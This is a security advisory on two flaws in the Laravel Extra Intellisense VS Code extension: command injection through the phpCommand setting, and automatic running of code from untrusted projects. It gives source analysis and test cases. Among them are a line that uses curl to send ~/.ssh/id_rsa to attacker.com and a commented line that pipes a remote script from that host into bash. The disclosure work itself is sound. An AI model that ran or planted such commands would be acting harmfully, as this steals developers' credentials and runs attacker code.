# Vulnerabilities in Laravel Extra Intellisense Extension

## 1. Command Injection Vulnerability in phpCommand Configuration

### Description
The Laravel Extra Intellisense extension allows users to configure a custom PHP command through the `LaravelExtraIntellisense.phpCommand` setting. This command is used to execute PHP code to extract data from the user's Laravel application. The extension performs a direct string replacement of `{code}` in the command template with PHP code without proper sanitization or validation of the command template itself. This allows a malicious actor to craft a phpCommand that includes additional OS commands which will be executed whenever the extension runs PHP code.

### Impact
An attacker could execute arbitrary system commands with the privileges of the VS Code user. This could lead to data theft, system compromise, or ransomware deployment. Since the extension periodically runs these commands automatically to update autocomplete data, the malicious commands would be repeatedly executed without requiring user action.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Basic escaping of double quotes and some special characters
- Additional escaping for Unix-like platforms
- The extension includes a security note in the documentation that warns users about the extension periodically running their Laravel application. However, this note doesn't explicitly warn about the command injection risk through the `LaravelExtraIntellisense.phpCommand` setting.

### Missing Mitigations
1. Input validation for the `LaravelExtraIntellisense.phpCommand` setting to prevent command chaining characters
2. Use of safer execution methods than direct command execution
3. Clear security warning about the risks of modifying the phpCommand setting
4. No proper command-line argument sanitization
5. Using string template replacement instead of proper argument passing
6. No validation of the phpCommand configuration value

### Preconditions
1. The user must have the VS Code extension installed
2. The `LaravelExtraIntellisense.phpCommand` setting must be set to a value containing command injection payloads
3. The extension must be enabled and running
4. A malicious user must have access to modify the VSCode configuration or trick a user into applying a malicious configuration

### Source Code Analysis
The vulnerability exists in the `runPhp` method in `helpers.ts`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    // Some escaping for Unix platforms
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    // Get the user-defined PHP command template
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";

    // Simply replace {code} with the PHP code to execute
    let command = commandTemplate.replace("{code}", code);

    // Execute the command directly using child_process.exec
    let out = new Promise<string>(function (resolve, error) {
        cp.exec(command,
            { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
            function (err, stdout, stderr) {
                // Process result...
            }
        );
    });
    return out;
}
```

The issue is that while the code parameter is escaped, there is no validation or sanitization of the `commandTemplate` itself. If a user (or an attacker who can modify the user's settings) sets the phpCommand to something like `php -r "{code}" && malicious-command`, the malicious command will be executed whenever the extension runs PHP code.

This method is called by various provider classes in the extension that periodically run PHP code to gather information about the Laravel application, such as in `ConfigProvider.ts`, `RouteProvider.ts`, etc.

The use of `cp.exec()` runs the command through a shell, which creates opportunity for command injection if the escaping is inadequate.

### Security Test Case
1. Install the Laravel Extra Intellisense extension in VS Code
2. Open the VS Code settings (Ctrl+,)
3. Search for "LaravelExtraIntellisense.phpCommand"
4. Change the value to: `php -r "{code}" && echo "Vulnerability demonstrated" > /tmp/vulnerable.txt`
5. Open a Laravel project in VS Code
6. The extension will automatically start gathering data for autocompletion
7. Check if the file `/tmp/vulnerable.txt` was created, containing the text "Vulnerability demonstrated"
8. If the file exists, the vulnerability is confirmed
9. On Windows, you could use: `php -r "{code}" & echo Vulnerability demonstrated > %TEMP%\vulnerable.txt`
10. For a more sophisticated attack, a command that exfiltrates data could be used:
    ```
    "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" && curl -d \"data=$(cat ~/.ssh/id_rsa)\" https://attacker.com/collect"
    ```

## 2. Arbitrary PHP Code Execution via Laravel Application Bootstrapping

### Description
The Laravel Extra Intellisense extension automatically executes PHP code from the Laravel application when a project is opened in VS Code. This execution happens without user interaction to gather information for autocompletion features. If a developer opens a malicious Laravel project (perhaps from GitHub or received from a colleague), any harmful code in that project's files (particularly in service providers or bootstrap files) will be executed automatically on the developer's machine.

The extension periodically runs the Laravel application by:
1. Including the application's autoloader and bootstrap files
2. Setting up a Laravel service provider
3. Running the application to extract data
4. Executing custom PHP code to get information about routes, views, etc.

### Impact
An attacker can create a malicious Laravel project with harmful code that executes automatically when opened in VS Code with this extension installed. The code runs with the same permissions as the VS Code process, allowing attackers to:
- Access, modify, or delete files on the user's system
- Exfiltrate sensitive data
- Execute additional malicious commands
- Establish persistence on the developer's machine

In Docker environments, this could mean root access to the container, allowing file system access, sensitive data exposure, or even container escape depending on the Docker configuration.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension includes a security note in the README:
> "This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete. [...] if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing."

However, this mitigation relies on user awareness and doesn't protect against malicious projects from external sources.

### Missing Mitigations
- No sandbox or isolation for PHP code execution
- No explicit user consent required before executing code from newly opened projects
- No validation or sanitization of PHP code being executed
- No execution with reduced privileges
- No option to disable automatic execution for untrusted projects
- No code signing or verification of Laravel project files

### Preconditions
- The user must have the Laravel Extra Intellisense extension installed in VS Code
- The user must open a malicious Laravel project in VS Code
- The user's system must have PHP installed and accessible

### Source Code Analysis
The vulnerability is in the `helpers.ts` file in the `runLaravel` and `runPhp` methods:

```typescript
// From helpers.ts
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            "class VscodeLaravelExtraIntellisenseProvider extends \\Illuminate\\Support\\ServiceProvider" +
            "{" +
            // ... provider definition ...
            "}" +
            "$app->register(new VscodeLaravelExtraIntellisenseProvider($app));" +
            // ... more bootstrap code ...
            code +  // <-- User-supplied code is inserted here
            // ... finalization code ...

        // This command is then passed to runPhp
    }
}
```

The extension watches for file changes and automatically runs this code to refresh its data. This means any malicious code in the Laravel application will be executed as soon as the project is opened, and whenever certain files are modified.

This automatic execution happens in various provider classes like `ConfigProvider.ts`, `RouteProvider.ts`, etc., which all use `Helpers.runLaravel()` to extract information from the Laravel application.

The execution path begins in the extension's `activate` function, which initializes all providers. These providers immediately begin collecting metadata by executing PHP code from the project.

### Security Test Case
To demonstrate this vulnerability:

1. Create a malicious Laravel project with this code in `app/Providers/AppServiceProvider.php`:
   ```php
   public function register()
   {
       // Create a file to demonstrate code execution
       file_put_contents('/tmp/vscode_laravel_exploit.txt', 'Arbitrary code execution successful!');

       // More harmful actions could be performed here
   }
   ```

2. Alternatively, create a malicious Laravel project with a modified model file in `app/Models/MaliciousModel.php`:
   ```php
   <?php
   namespace App\Models;

   use Illuminate\Database\Eloquent\Model;

   class MaliciousModel extends Model
   {
       public function __construct()
       {
           parent::__construct();

           // Create a malicious file for proof of concept
           file_put_contents(
               '/tmp/vscode_laravel_extra_intellisense_exploit.txt',
               'Exploitation successful at ' . date('Y-m-d H:i:s')
           );

           // For more severe exploitation, could include shell commands:
           // system('curl -s http://attacker.com/payload.sh | bash');
       }
   }
   ```

3. Bundle this as a complete Laravel project with standard directory structure including:
   - app/ directory
   - vendor/autoload.php
   - bootstrap/app.php
   - routes/ directory

4. Open the project in VS Code with the Laravel Extra Intellisense extension installed

5. Without any additional user interaction, verify that the file `/tmp/vscode_laravel_exploit.txt` has been created

6. The exploitation happens automatically because:
   - The extension watches for file changes in `RouteProvider.ts`, `ViewProvider.ts`, etc.
   - When files change or when the project is opened, `loadRoutes()`, `loadViews()`, etc. are called
   - These methods call `Helpers.runLaravel()` which executes PHP code
   - This execution includes the Laravel bootstrap process, which runs service providers
   - The malicious code in the service provider is executed

7. For Docker environments, create a more dangerous scenario by configuring the extension to use Docker:
   ```json
   "LaravelExtraIntellisense.phpCommand": "docker exec -u root laravel_container php -r \"{code}\""
   ```

This demonstrates that simply opening a project in VS Code can lead to arbitrary code execution without any further user interaction.
